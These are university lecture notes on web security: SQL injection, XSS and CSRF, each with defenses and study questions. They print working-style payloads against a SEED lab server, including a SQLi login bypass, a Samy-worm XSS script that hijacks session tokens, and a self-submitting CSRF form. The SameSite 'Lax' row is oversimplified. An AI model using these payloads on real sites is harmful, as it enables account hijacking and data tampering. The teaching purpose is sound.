# Web Security — Web Applications 2025-26

_Source: `12-webapp-2025-26-WebSecurity.pdf` — Web Applications, A.Y. 2025/2026, Francesco L. De Faveri, Padova, April 28th, 2026_

## Table of Contents

- [[#Cybersecurity and Web|Cybersecurity and Web]]
  - [[#Lecture Scope and Lab Material|Lecture Scope and Lab Material]]
  - [[#CIA Triad|CIA Triad]]
  - [[#Web Security|Web Security]]
  - [[#OWASP Top Ten|OWASP Top Ten]]
  - [[#Attack Scenario|Attack Scenario]]
- [[#SQL Injection|SQL Injection]]
  - [[#What is SQL Injection?|What is SQL Injection?]]
  - [[#SQL Special Characters|SQL Special Characters]]
  - [[#How SQL Injection Works|How SQL Injection Works]]
  - [[#Vulnerable Code Example|Vulnerable Code Example]]
  - [[#Protection: Prepared Statements|Protection: Prepared Statements]]
- [[#Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]]
  - [[#What is XSS?|What is XSS?]]
  - [[#XSS Types|XSS Types]]
  - [[#Stored XSS Flow|Stored XSS Flow]]
  - [[#XSS Example Code|XSS Example Code]]
  - [[#Protection: XSS|Protection: XSS]]
- [[#Cross-Site Request Forgery (CSRF)|Cross-Site Request Forgery (CSRF)]]
  - [[#What is CSRF?|What is CSRF?]]
  - [[#CSRF Schemas|CSRF Schemas]]
  - [[#CSRF Example Code|CSRF Example Code]]
  - [[#Protection: SameSite Cookie|Protection: SameSite Cookie]]
- [[#Summary Table|Summary Table]]

---

## Cybersecurity and Web

### Lecture Scope and Lab Material

The lecture covers:

1. Cybersecurity and Web Security
2. SQL Injection
3. Cross-Site Scripting (XSS)
4. Cross-Site Request Forgery (CSRF)

Hands-on material from the slides:

- Git repository: `WA-WebSecurity` repo, with Docker containers and README
- VM used for the lab: VM Drive
- Hostname setup:
  - Linux: edit `/etc/hosts` with `sudo nano /etc/hosts`
  - Windows: run Notepad as Administrator and open `C:\Windows\System32\drivers\etc\hosts`
  - Follow the repository `README.md` instructions when modifying the hosts file

### CIA Triad

> [!Important] CIA Triad — Core Cybersecurity Objectives
> Three fundamental security properties every system must guarantee:
>
> | Property | Definition |
> |----------|-----------|
> | **Confidentiality** | Information available only to intended users |
> | **Integrity** | Information is not altered; received exactly as sent |
> | **Availability** | Information is always accessible when the user needs it |
>
> **Intuition:** Break any one of these and the system is compromised — steal data (C), tamper data (I), or knock the server offline (A).

### Web Security

**Web security** = exploitation and defense of websites and web applications.

An attacker must first understand:
- Which components the application uses
- How it expects to interact with users

Common attacker motives: espionage, extortion, theft, fun.

### OWASP Top Ten

**OWASP** (*Open Worldwide Application Security Project*) publishes the **Top 10** — a standard awareness document for developers and web security professionals. First step toward more secure software development.

![[websec-owasp-top10.jpg]]

OWASP Top 10 evolution highlights (2017 → 2021 → 2025):
- **Injection** (SQLi, XSS) — consistently in top 5
- **Broken Access Control** — #1 in 2021 and 2025
- **XSS** — was A07:2017, merged into Injection category in later editions
- **SSRF** — A10:2021 (*Server-Side Request Forgery*); this is distinct from CSRF, which is treated separately in this lecture

Attacks covered in this lecture:
1. SQL Injection
2. Cross-Site Scripting (XSS)
3. Cross-Site Request Forgery (CSRF)

### Attack Scenario

![[websec-scenario.jpg]]

Web application attack surface: users (legitimate and attacker) interact via HTTP with a Web Server, which executes SQL Queries against a Database. Attacker has same HTTP access as normal users — the vulnerability lies in how input is processed.

---

## SQL Injection

### What is SQL Injection?

> [!Important] SQL Injection Definition
> **SQL Injection** is a type of **Code Injection** attack — it exploits vulnerabilities in the interface between a web application and its database.
>
> *"It is an attack that exploits vulnerabilities in the interface of a Web Application."*
>
> Root cause: **untrusted user data mixed with trusted SQL code** to form a SQL statement.
>
> **Intuition:** The database parser cannot distinguish between "intended SQL code" and "injected SQL code" when they arrive as a single string.

> [!Example] xkcd "Bobby Tables" intuition
> The slide references xkcd 327. The attacker's input is a name that contains SQL syntax:
>
> ```sql
> Robert'); DROP TABLE Students;--
> ```
>
> If the application concatenates that string into a SQL query, the injected `DROP TABLE` can be interpreted as SQL code. The lesson is to sanitize database inputs and, more importantly, avoid mixing user data with SQL code.

### SQL Special Characters

Attackers exploit SQL syntax to break out of strings and inject commands:

| Character | Meaning |
|-----------|---------|
| `;` | Query terminator |
| `--` or `#` | Single-line comment (ignores rest of query) |
| `/* */` | Multi-line comment |
| `'` | String delimiter |

Key SQL operations exploitable via injection:

| Operation | Effect |
|-----------|--------|
| `SELECT` | Read records |
| `DROP` | Delete table/database |
| `INSERT INTO` | Add records |
| `UPDATE` | Modify records |

### How SQL Injection Works

![[websec-sqli-mixing.jpg]]

The core problem: user input and SQL code are mixed together to form a SQL statement.

![[websec-sqli-flow.jpg]]

Flow: **Untrusted User Data + Trusted SQL Code → Mixing → SQL Statement → SQL Parser → (Data + SQL Code) → Execution**

The SQL parser cannot distinguish injected SQL from intended SQL — it executes everything.

> [!Warning] SQL Injection Attack Pattern
> Classic authentication bypass:
> ```sql
> -- Intended query:
> SELECT Name, Salary, SSN FROM employee
> WHERE eid = '$eid' AND password = '$pwd'
>
> -- Attacker inputs eid = " ' OR '1'='1' -- "
> -- Resulting query:
> SELECT Name, Salary, SSN FROM employee
> WHERE eid = '' OR '1'='1' -- ' AND password = '...'
> ```
> `'1'='1'` always true; `--` comments out password check → **authentication bypassed**.
> **Mitigazione:** Never concatenate user input into SQL strings.

### Vulnerable Code Example

![[websec-sqli-vulnerable-code.jpg]]

```php
$conn = new mysqli("localhost", "root", "seedubuntu", "dbtest");
$sql = "SELECT Name, Salary, SSN
        FROM employee
        WHERE eid = '$eid' and password = '$pwd'";
$conn->query($sql);
$result = $conn->query($sql);
```

Problem: `$eid` and `$pwd` are inserted directly from user input into the SQL string — no sanitization, no separation.

### Protection: Prepared Statements

![[websec-sqli-prepared-stmt.jpg]]

> [!Important] Prepared Statements — Primary Defense
> **Prepared statements** separate code from data: the SQL structure is compiled first with placeholders (`?`), then user data is bound separately. The database parser processes them as two distinct things.
>
> ```php
> $conn = new mysqli("localhost", "root", "seedubuntu", "dbtest");
> $sql = "SELECT Name, Salary, SSN
>         FROM employee
>         WHERE eid = ? and password = ?";
> if ($stmt = $conn->prepare($sql)) {
>     $stmt->bind_param("ss", $eid, $pwd);   // bind as strings
>     $stmt->execute();
>     $stmt->bind_result($name, $salary, $ssn);
> }
> ```
> **Intuition:** `?` is a placeholder — the DB compiles the query structure before it ever sees the user data. Injected SQL syntax in `$eid` is treated as plain string data, never as code.

Additional defense: **filter out / encode** special characters (`;`, `'`, `--`) before use in queries.

---

## Cross-Site Scripting (XSS)

### What is XSS?

> [!Important] XSS Definition
> **XSS** (*Cross-Site Scripting*) is a vulnerability that allows attackers to **inject malicious scripts** (typically JavaScript) into web pages viewed by other users.
>
> The injected script executes in the victim's browser with the **privileges of the trusted site** — same origin, same cookies, same session.
>
> **Intuition:** XSS is the HTML/JS version of SQL Injection — instead of injecting SQL into a database query, you inject script into a page served to other users.

### XSS Types

| Type | Mechanism | Storage |
|------|-----------|---------|
| **Stored XSS** (Persistent) | Script stored in DB, executed when retrieved by any user | Server-side DB |
| **Reflected XSS** | Malicious URL; script reflected by server in response, never stored | Not stored |
| **DOM-Based XSS** | Exploit DOM manipulation vulnerabilities in client-side JS | Client-side only |

### Stored XSS Flow

![[websec-xss-stored-flow.jpg]]

**Attack flow:**
1. Attacker submits form containing `<script>malicious code</script>`
2. API receives data and stores it in DB without sanitization
3. Any user who requests that data triggers the API
4. API collects data from DB and sends to client
5. Data injected into the DOM for rendering
6. Browser encounters `<script>` → **interpreted and executed as JavaScript**

The JS code executes when encountered during DOM construction.

### XSS Example Code

![[websec-xss-example-code.jpg]]

> [!Example] Stored XSS — Samy Worm pattern
> **Contesto:** Attacker stores malicious JS in their profile on a social network.
> **Codice:**
> ```javascript
> <script type="text/javascript">
> window.onload = function () {
>     var Ajax = null;
>
>     // Get tokens capturing the HTTP request
>     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
>     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
>
>     // Construct the HTTP request to add Samy as a friend
>     var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
>
>     // Create and send Ajax request to add friend
>     Ajax = new XMLHttpRequest();
>     Ajax.open("GET", sendurl, true);
>     Ajax.send();
> }
> </script>
> ```
> **Spiegazione:** When any user views the attacker's profile, this script fires automatically — captures the viewer's session tokens and uses them to send a forged "add friend" request on their behalf. The victim never notices.

### Protection: XSS

> [!Warning] XSS Mitigations
> No single measure is 100% effective. Defense-in-depth:
>
> 1. **Modern frameworks** — React, Angular, Vue have built-in output encoding; use them
> 2. **Output encoding** — encode HTML special characters before rendering user content (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`)
> 3. **HTML Sanitization** — OWASP recommends **DOMPurify** library to strip dangerous tags/attributes
>
> **Mitigazione:** Never insert unsanitized user data into the DOM. Treat all user input as untrusted.

---

## Cross-Site Request Forgery (CSRF)

### What is CSRF?

> [!Important] CSRF Definition
> **CSRF** (*Cross-Site Request Forgery*) tricks an authenticated user's browser into sending an **unauthorized request** to a site where the user is logged in — using the victim's own session cookies.
>
> Key distinction:
> - **Same-site request**: page from Website A sends HTTP request to Website A — normal
> - **Cross-site request**: page from Website A (or attacker's page) sends HTTP request to Website B — CSRF target
>
> **Intuition:** The server cannot distinguish whether a POST request came from the legitimate page or from a malicious page — both carry the victim's cookies.

### CSRF Schemas

**Schema 1** — Normal cross-site request behavior:

![[websec-csrf-schema1.jpg]]

Browser holds cookies for both Website A and Website B. A cross-site request from Website A to Website B automatically attaches Website B's cookies.

**Schema 2** — Attacker exploits cross-site requests:

![[websec-csrf-schema2.jpg]]

Attacker creates a malicious page that automatically triggers cross-site requests to Website A and/or Website B. The browser attaches the victim's cookies → server accepts as authenticated request.

### CSRF Example Code

![[websec-csrf-example.jpg]]

> [!Example] CSRF Forged POST Request
> **Contesto:** Attacker's page automatically submits a profile-edit form to the victim's social network.
> **Codice:**
> ```html
> <html>
> <body>
> <h1>This page forges an HTTP POST request.</h1>
> <script type="text/javascript">
>     function forge_post() {
>         var fields;
>         // Hidden form fields — victim won't see them
>         fields += "<input type='hidden' name='name' value='Alice'>";
>         fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
>         fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
>         fields += "<input type='hidden' name='guid' value='56'>";
>
>         // Create <form> element
>         var p = document.createElement("form");
>         // Construct the form
>         p.action = "http://www.seed-server.com/action/profile/edit";
>         p.innerHTML = fields;
>         p.method = "post";
>         // Append the form to the current page
>         document.body.appendChild(p);
>         // Submit the form
>         p.submit();
>     }
>
>     // Invoke forge_post() after the page is loaded
>     window.onload = function() { forge_post(); }
> </script>
> </body>
> </html>
> ```
> **Spiegazione:** As soon as the victim loads the attacker's page, `forge_post()` fires, constructs a hidden form targeting the victim's social network, and submits it. The browser attaches the victim's session cookie → server processes it as a legitimate profile edit.

### Protection: SameSite Cookie

> [!Important] SameSite Cookie Attribute
> The `SameSite` attribute on cookies controls whether cookies are sent with **cross-site requests**.
>
> The attribute is set by the **server**. Cookies with `SameSite` are always sent with same-site requests; whether they are sent with cross-site requests depends on the attribute value.
>
> | Value | Behavior |
> |-------|----------|
> | `Strict` | Cookie **not sent** with any cross-site request |
> | `Lax` | Cookie sent with cross-site requests |
>
> **Intuition:** `SameSite=Strict` breaks CSRF completely — the forged POST request arrives without the victim's session cookie, so the server rejects it as unauthenticated.
>
> Supported in Chrome, Opera, and modern browsers.

---

## Summary Table

| Attack | Target | Mechanism | Root Cause | Primary Defense |
|--------|--------|-----------|-----------|----------------|
| **SQL Injection** | Database | Inject SQL into query string | Mixing user input with SQL code | Prepared statements; input encoding |
| **Stored XSS** | Other users' browsers | Store `<script>` in DB; execute on retrieval | Unsanitized user input rendered as HTML | Output encoding; DOMPurify |
| **Reflected XSS** | Individual user via crafted URL | Malicious URL parameter reflected in response | Server echoes unescaped input | Output encoding; input validation |
| **DOM-Based XSS** | User's browser | Client-side JS inserts attacker data into DOM | Unsafe `innerHTML`/`document.write` | Avoid dangerous DOM APIs; sanitize |
| **CSRF** | Authenticated session | Forged cross-site request with victim's cookies | Server trusts cookies from cross-site requests | `SameSite=Strict` cookie |

| Defense | Protects Against | How |
|---------|-----------------|-----|
| **Prepared statements** | SQL Injection | Separate code and data; placeholders |
| **Input encoding/filtering** | SQL Injection, XSS | Escape special chars before use |
| **Output encoding** | XSS | HTML-encode before rendering |
| **DOMPurify / HTML sanitization** | XSS | Strip dangerous tags/attributes |
| **`SameSite=Strict` cookie** | CSRF | Block cookies on cross-site requests |
| **Modern frameworks** | XSS | Built-in escaping (React, Angular, Vue) |

## Questions

1. How do confidentiality, integrity, and availability define the main security goals of a web application?
2. Why must an attacker understand the application's components and expected user interactions before exploiting it?
3. What is the purpose of the OWASP Top Ten, and why do categories such as injection and broken access control remain important?
4. In the attack scenario diagram, why does giving the attacker normal HTTP access create risk when input handling is weak?
5. What is the root cause of SQL injection, and why does mixing untrusted user data with trusted SQL code confuse the database parser?
6. How do characters such as `'`, `;`, `--`, and comments help attackers alter SQL query structure?
7. How does the xkcd `Robert'); DROP TABLE Students;--` example show the danger of mixing user data with SQL code?
8. Why do prepared statements prevent SQL injection more reliably than manual string filtering alone?
9. How is XSS similar to SQL injection conceptually, and how is the target of the injected code different?
10. How do stored, reflected, and DOM-based XSS differ in where the malicious script is stored or reflected?
11. In the stored XSS flow, where should validation, sanitization, or encoding be applied to prevent the browser from executing attacker-controlled script?
12. How does the Samy Worm style example use a victim's browser privileges and session tokens against a trusted site?
13. Why is output encoding different from input validation, and why are both relevant for XSS defense?
14. How does CSRF exploit the browser's automatic cookie sending behavior for cross-site requests?
15. How does `SameSite=Strict` change browser cookie behavior, and why does that help block forged POST requests?
16. How would you combine prepared statements, output encoding, DOM sanitization, and SameSite cookies into a defense-in-depth strategy?
